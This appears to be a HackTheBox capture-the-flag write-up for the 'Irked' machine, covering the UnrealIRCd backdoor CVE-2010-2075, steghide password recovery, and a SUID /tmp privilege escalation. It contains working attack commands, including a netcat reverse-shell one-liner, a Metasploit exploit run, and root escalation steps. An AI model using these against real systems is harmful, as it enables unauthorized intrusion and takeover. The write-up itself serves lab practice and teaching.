Irked

HackTheBox · Easy by Brenno M.

Irked runs UnrealIRCd 3.2.8.1 with the backdoor planted in the official package in 2009 (CVE-2010-2075). A password hidden with steganography leads to the user djmardov, and a SUID binary that runs a file from /tmp finishes off root.

Reconnaissance

Besides SSH, Apache and rpcbind, UnrealIRCd listens on 6697, 8067 and 65534. The web page only shows an image and the note "IRC is almost working!".

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
# 22, 80, 111, 6697, 8067, 46492, 65534
nmap -Pn -n -sT -sV -sC -p22,80,111,6697,8067,65534 <IP>
# 22 OpenSSH 6.7p1, 80 Apache 2.4.10, 6697/8067/65534 UnrealIRCd

Exploitation - CVE-2010-2075

The UnrealIRCd 3.2.8.1 tarball distributed between 2009 and 2010 was swapped for a version that executes any message starting with AB;. One line is enough for a shell as ircd.

nc -lvnp 4444
echo "AB; nc -e /bin/bash <MY_IP> 4444" | nc <IP> 8067
msfconsole -q
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS <IP>
set RPORT 65534
set payload cmd/unix/reverse
set LHOST tun0
run

Lateral movement - steganography

In /home/djmardov/Documents, .backup says "steg backup pw" and holds a password. The only image in sight is the site's irked.jpg, and steghide pulls djmardov's SSH password out of it.

cat /home/djmardov/Documents/.backup
# Super elite steg backup pw
# UPupDOWNdownLRlrBAbaSSss
wget http://<IP>/irked.jpg
steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
cat pass.txt
ssh djmardov@<IP>
cat ~/user.txt

Escalation - SUID viewuser

/usr/bin/viewuser is SUID root and not a standard binary. When run, it complains that /tmp/listusers does not exist: the program calls setuid(0) and executes that file. We just create it.

find / -type f -perm -4000 2>/dev/null
/usr/bin/viewuser
# sh: 1: /tmp/listusers: not found
printf '/bin/sh' > /tmp/listusers
chmod +x /tmp/listusers
/usr/bin/viewuser
id   # uid=0(root)
cat /root/root.txt
